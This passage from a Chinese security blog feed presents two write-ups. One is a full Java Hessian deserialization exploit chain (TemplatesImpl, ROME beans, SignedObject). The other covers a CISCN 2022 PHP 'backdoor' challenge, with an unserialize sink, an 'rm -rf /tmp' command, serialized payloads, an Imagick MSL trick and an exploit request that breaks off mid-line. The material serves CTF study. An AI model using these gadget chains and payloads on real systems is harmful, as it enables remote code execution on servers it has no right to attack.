setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(TemplatesImpl.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(objectBean,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payload = serialize(hashMap);</span><br><span class="line">        deserialize(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里其实是由于<code>TemplatesImpl</code>类中被<code>transient</code>修饰的<code>_tfactory</code>属性无法被序列化，进而导致<code>TemplatesImpl</code>类无法初始化<img src="../images/image-20230706175648609.png" alt="image-20230706175648609"></p><p><strong>但是如果在jdk的原生反序列化的话就可以序列化成功</strong></p><p>我们知道，在使用Java原生的反序列化时，如果被反序列化的类重写了<code>readObject()</code>，那么Java就会通过反射来调用重写的<code>readObject()</code></p><p><img src="../images/image-20230706175844926.png" alt="image-20230706175844926"></p><p>可以看到这里手动new了一个TransformerFactoryImpl类赋值给<code>_tfactory</code>，这样就解决了<code>_tfactory</code>无法被序列化的情况</p><p>当一个变量被声明为 transient 时，在进行对象的序列化过程中，该变量的值不会被持久化保存到字节流中。这意味着在对象被反序列化后，<strong>该变量的值将会被设置为其默认值，而不是序列化时的值。</strong></p><p>如果一个类中包含了 <code>readObject</code> 方法，在对象进行反序列化时，会按照以下顺序执行相关操作：</p><ol><li>默认的反序列化操作会读取对象的非 transient 字段，并将它们的值恢复。</li><li>如果类中有 <code>readObject</code> 方法，那么该方法会被调用。在这个方法中，你可以自定义读取和恢复对象状态的过程。你可以使用 <code>defaultReadObject</code> 方法读取默认字段值，也可以通过实现自定义逻辑来恢复其他字段的值。</li><li>反序列化过程完成后，返回反序列化后的对象。</li></ol><p><strong>所以说就是变量被声明为 transient的时候可以进行序列化操作，只不过是会再反序列化(<code>readobject</code>)的时候值仍然是默认值</strong> </p><p><strong>那么我们应该怎么办呢  想法就是想让其进行序列化成功，如何然后再使用<code>hessian</code>进行反序列化</strong></p><p>这里的话我们就可以想到二次反序列化了  这里使用的是<code>SignedObject</code>这个类</p><p><img src="../images/image-20230706180355930.png" alt="image-20230706180355930"></p><p><strong>这里面用的就是原生的jdk序列</strong></p><p>在SignedObject类的构造函数能够序列化一个类并且将其存储到属性<code>content</code>中</p><p>在其<code>getObject()</code>中能够将其反序列化出来，并且该方法还是getter</p><p><img src="../images/image-20230706200004122.png" alt="image-20230706200004122"></p><p>rome 的<code>ToStringBean</code>的<code>toString()</code>方法  是可以调用任意<code>getter</code>方法的</p><p><strong>这就完美符合我们的利用条件，于是可以构造出如下Payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian2_SignedObject</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\ctf application\\idea_vip\\IntelliJ IDEA 2023.1.2\\project\\Hessian\\src\\main\\java\\org\\example\\calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//此处写法较为固定，用于初始化SignedObject类</span></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException,privateKey,signingEngine);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean1);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean, equalsBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payload = Hessian2_Serial(hashMap);</span><br><span class="line">        Hessian2_Deserial(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] Hessian2_Serial(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        hessian2Output.writeObject(o);</span><br><span class="line">        hessian2Output.flushBuffer();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Hessian2_Deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> hessian2Input.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>个人理解</strong></p><p>在序列化的时候<img src="../images/image-20230706214832344.png" alt="image-20230706214832344"></p><p>这个回执行里面的方法来奖上面的<code>templatesimpl</code>给序列化掉</p><p>然后在反序列化的时候</p><p><img src="../images/image-20230706214927202.png" alt="image-20230706214927202"></p><p>这个方法会调用任意<code>getter</code>方法  然后就会调用到<code>SignedObject</code>里面的<code>getObject</code>方法</p><p><img src="../images/image-20230706215135347.png" alt="image-20230706215135347"></p><p>然后就会执行反序列化操作  最后执行恶意代码</p><p><img src="../images/image-20230706215244806.png" alt="image-20230706215244806"></p><h3 id="Apache-Dubbo-Hessian2异常处理反序列化漏洞（CVE-2021-43297）"><a href="#Apache-Dubbo-Hessian2异常处理反序列化漏洞（CVE-2021-43297）" class="headerlink" title="Apache Dubbo Hessian2异常处理反序列化漏洞（CVE-2021-43297）"></a>Apache Dubbo Hessian2异常处理反序列化漏洞（CVE-2021-43297）</h3><p>这里的话了解就行  因为搭建环境比较麻烦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://goodapple.top/archives/1193&quot;&gt;文章1&lt;/a&gt;    &lt;a href=&quot;https://su18.org/post/hessian/#xbean&quot;&gt;文章2&lt;/a&gt;  &lt;a href=&quot;https://juejin.</summary>
      
    
    
    
    
    <category term="java-Hessian" scheme="https://ke1nys.github.io/tags/java-Hessian/"/>
    
  </entry>
  
  <entry>
    <title>ciscn决赛-2022-backdoor</title>
    <link href="https://ke1nys.github.io/posts/869a12bf.html"/>
    <id>https://ke1nys.github.io/posts/869a12bf.html</id>
    <published>2023-06-21T07:58:09.000Z</published>
    <updated>2023-06-21T08:41:22.393Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.snakin.top/2022/09/09/2022CISCN%E5%86%B3%E8%B5%9B/">题目wp</a></p><p><a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">题目中关键的利用知识点</a></p><p><a href="https://github.com/AFKL-CUIT/CTF-Challenges/tree/master">这里面有backdoor的docker容器</a></p><p>这里写这篇文章的目的是来加深对这道题的理解</p><p><strong>题目源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;stdclass&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;path)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;path;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;__sleep failed...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;do_exec_func &amp;&amp; </span><br><span class="line">                <span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>, <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">            ) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$argv</span> = <span class="variable language_">$this</span>-&gt;argv;</span><br><span class="line">                <span class="variable">$class</span> = <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">                <span class="title">new</span> $<span class="title">class</span>($<span class="title">argv</span>); // 没有<span class="title">echo</span></span></span><br><span class="line"><span class="class">            &#125;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">cmd</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">cmd</span>&#x27;];</span></span><br><span class="line"><span class="class">$<span class="title">data</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">data</span>&#x27;];</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">switch</span> ($<span class="title">cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;unserialze&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;rm&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读代码，存在两个魔法函数：</p><ul><li><code>__sleep()</code>，执行serialize()时，先会调用这个函数。这里可以实现任意文件包含。</li><li><code>__wakeup()</code>，执行unserialize()时，先会调用这个函数。这里可以执行一次无参函数结构。</li></ul><p>对于<code>__sleep__</code>来说，如果我们能够包含临时文件或者session即可rce。</p><p>目前的思路就有了，我们能够通过回调函数调用<code>session_start</code>，这里会触发序列化操作，如果我们能够控制session内容，那么就可以触发<code>__sleep</code>函数进行文件包含达成rce。接下来的目标则是想办法控制session内容。</p><p>(<strong>这个<code>session_start</code>是关键，在开启这个的时候会自动进行序列化，就是将session里的值进行序列化后存入存储介质中，然后因为访问了session中的数据，会自动将session中的值进行反序列化操作</strong>)</p><p><img src="../images/image-20230621160515951.png" alt="image-20230621160515951"></p><p>(<strong>是先进行—-反序列化—-在进行—-序列化—-操作</strong>)</p><p>对于<code>__wakeup__</code>来说，我们可以执行一次php内部类，那么我们可以利用此来探测信息</p><p>构造反序列化payload查看phpinfo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621162803997.png" alt="image-20230621162803997"></p><p>发现imagick拓展，想起之前看过的文章<a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">exploiting-arbitrary-object-instantiations</a>，文章讲述了针对以下结构的php代码的一种攻击方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>再查看一下<code>__wakeup</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">           <span class="keyword">if</span> (</span><br><span class="line">               <span class="variable language_">$this</span>-&gt;do_exec_func &amp;&amp; </span><br><span class="line">               <span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>, <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">           ) &#123;</span><br><span class="line">                   <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="variable">$argv</span> = <span class="variable language_">$this</span>-&gt;argv;</span><br><span class="line">               <span class="variable">$class</span> = <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="class">               </span></span><br><span class="line"><span class="class">               <span class="title">new</span> $<span class="title">class</span>($<span class="title">argv</span>); </span></span><br><span class="line"><span class="class">           &#125;</span></span><br><span class="line"><span class="class">   &#125;</span></span><br></pre></td></tr></table></figure><p>一方面题目给了同类型代码，另一方面题目限制了通过内置类的利用，显然我们需要利用<code>imagick</code>的特性进行攻击</p><p><code>imagick</code>类在初始化时可以执行<code>Magick Scripting Language</code>。那么考虑用其特性，在临时文件中写入<code>Magick Scripting Language</code>，然后在<code>imagick</code>类<strong>初始化的时候执行临时文件并且写入<code>session</code>文件</strong>。再触发<code>__sleep</code>包含<code>session</code>文件以<code>RCE</code>。</p><p>首先利用网站提供的功能，删除<code>/tmp</code>下的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:9999/?cmd=rm</span></span><br></pre></td></tr></table></figure><p>接下来发包写入session</p><p>构造反序列化数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="string">&quot;vid:msl:/tmp/php*&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;imagick&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p><strong>最后在反序列化的时候是会执行这样</strong>  <code>new imagick(&quot;vid:msl:/tmp/php*&quot;)</code></p><p>发包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /?data=O%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backdoor%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>path%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>argv%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>vid%<span class="number">3</span>Amsl%<span class="number">3</span>A%<span class="number">2</span>Ftmp%<span class="number">2</span>Fphp*%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>imagick%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>do_exec_func%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>B%<span class="number">7</span>D&amp;cmd=unserialze HTTP/<span class="number">1.1</span></span><br><span 